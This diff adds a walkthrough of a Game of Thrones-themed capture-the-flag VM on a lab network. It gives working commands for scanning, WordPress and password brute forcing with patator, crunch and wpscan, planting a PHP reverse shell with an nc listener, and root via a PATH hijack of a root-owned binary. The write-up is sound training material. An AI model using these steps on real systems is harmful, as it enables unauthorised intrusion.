@@ -1,0 +1,119 @@
+netdiscover -r 192.168.190.0/24 -i vmnet1
+192.168.190.132
+
+nmap -p 1-65535 -T4 -A -v 192.168.190.132
+----------------------
+ssh root@192.168.190.132
+
+as you can see a hash
+wDOW0gW/QssEtq5Y3nHX4XlbH/Dnz27qHFhHVpMulJSyDCvex++YCd42tx7HKGgB
+and in the ascii drawing there is AES and ECB and xxxxx0000000xxxxxx
+so we assume the key is xxxxx0000000xxxxxx and the algorithm is AES with ECB mode
+after decrypt that online
+Italy Flag: 0047449b33fbae830d833721edaef6f1
+-----------------------
+using Squid http proxy on port 3129 on firefox and then access the webserver
+then using dirb to extract files on the server
+dirb http://192.168.190.132 -R -o dirb.txt -p 192.168.190.132:3129
+then tried to access /blog via proxy and i got wordpress then clicked on i have a message for you
+then i navigated to /blog/hodor and gave me a zip file . after extraction
+
+echo UG9ydHVnYWwgRmxhZzogYTI2NjNiMjMwNDVkZTU2YzdlOTZhNDA2NDI5ZjczM2Y= | base64 -d
+Portugal Flag: a2663b23045de56c7e96a406429f733f
+-----------------------
+at the end of the blog page there is Protected: The secret Chapter
+
+i tried to extract all words of this page and put it in one file and use it as wordlist
+
+cewl --proxy_host 192.168.190.132 --proxy_port 3129 http://192.168.190.132/blog/ > words.lst
+
+the use patator to brute force
+patator http_fuzz http_proxy=192.168.190.132:3129 url='http://192.168.190.132/blog/wp-login.php?action=postpass'
+method=POST header='Referer: "http://192.168.190.132/blog/index.php/2016/10/16/the-secret-chapter/"'
+body='post_password=FILE0&Submit=Enter' 0=words.lst -x ignore:fgrep='post-password-form' follow=1 accept_cookie=1
+
+and the password is "Westerosi"
+
+and the hash UGFyYWd1YXkgRmxhZzogNDc2MWI2NWYyMDA1MzY3NDY1N2M3ZTYxODY2MjhhMjk=
+
+then
+echo UGFyYWd1YXkgRmxhZzogNDc2MWI2NWYyMDA1MzY3NDY1N2M3ZTYxODY2MjhhMjk= | base64 -d
+Paraguay Flag: 4761b65f20053674657c7e6186628a29
+
+-------------------
+notice
+
+The mother_of_dragons has a password which is in front of your eyes
+Then
+She uses the Field Training Preparation for her army --- FTP
+
+i tried to access ftp via port 21211 with user name mother_of_dragons
+and password in front of your eyes
+then i did ls and i found readme.txt which contain I keep a hidden note for myself
+then i tried ls -a i found .note.txt which contain
+"I always forgot passwords, so for my blog account I used  my children`s name.
+
+-= Daenerys =-""
+names of Daenerys's dragons are Rhaegal Viserion Drogon
+i generated 2 wordlists as password one with capital initials and one with not
+crunch 1 1 -p Rhaegal Viserion Drogon > wordpress.pass
+crunch 1 1 -p rhaegal viserion drogon > wordpress2.pass
+then i tried brute force using wpscan
+wpscan --proxy 192.168.190.132:3129 --url http://192.168.190.132/blog/
+--wordlist wordpress.pass --username mother_of_dragons
+
+Brute Forcing 'mother_of_dragons'
++----+-------------------+------+-----------------------+
+| Id | Login             | Name | Password              |
++----+-------------------+------+-----------------------+
+|    | mother_of_dragons |      | RhaegalDrogonViserion |
++----+-------------------+------+-----------------------+
+
+i noticed something in the output
+[+] Interesting header: X-XSS-PROTECTION:
+Q3JvYXRpYSBGbGFnOiAwYzMyNjc4NDIxNDM5OGFlYjc1MDQ0ZTljZDRjMGViYg==
+then
+
+echo Q3JvYXRpYSBGbGFnOiAwYzMyNjc4NDIxNDM5OGFlYjc1MDQ0ZTljZDRjMGViYg== | base64 -d
+Croatia Flag: 0c326784214398aeb75044e9cd4c0ebb
+----------------
+then access via wordpress with username mother_of_dragons and password RhaegalDrogonViserion
+
+the i searched in the panel and found Biographical Info
+then
+echo VGhhaWxhbmQgRmxhZzogNmFkNzk2NWQxZTA1Y2E5OGIzZWZjNzZkYmY5ZmQ3MzM= | base64 -d
+Thailand Flag: 6ad7965d1e05ca98b3efc76dbf9fd733
+---------------------------
+then i edited the index.php and added php reverse shell on port 1234
+with nc -lvp 1234
+then navigate to /srv/http
+cat reward_flag.txt
+TW9uZ29saWEgRmxhZzogNmI0OWMxM2NjY2Q5MTk0MGYwOWQ3OWUxNDIxMDgzOTQ=
+then
+echo TW9uZ29saWEgRmxhZzogNmI0OWMxM2NjY2Q5MTk0MGYwOWQ3OWUxNDIxMDgzOTQ= | base64 -d
+Mongolia Flag: 6b49c13cccd91940f09d79e142108394
+------------------------
+there is a file winterfell_messenger owned by root when i tried to execute it
+cat: /root/message.txt: No such file or directory
+
+then i tried to execute bash as cat instead (priv escalation)
+echo "/bin/bash" > /tmp/cat (don't try cp command it won't work)
+chmod +x /tmp/cat
+then add tmp to default path
+PATH=/tmp:$PATH
+./winterfell_messenger
+whoami
+root
+id
+uid=0(root) gid=33(http) groups=33(http)
+
+then cd /root
+ls -a
+less .flag.txt
+Congratulations!
+
+U29tYWxpYSBGbGFnOiA0YTY0YTU3NWJlODBmOGZmYWIyNmIwNmE5NThiY2YzNA==
+then
+echo U29tYWxpYSBGbGFnOiA0YTY0YTU3NWJlODBmOGZmYWIyNmIwNmE5NThiY2YzNA== | base64 -d
+Somalia Flag: 4a64a575be80f8ffab26b06a958bcf34
+-------------------------------------
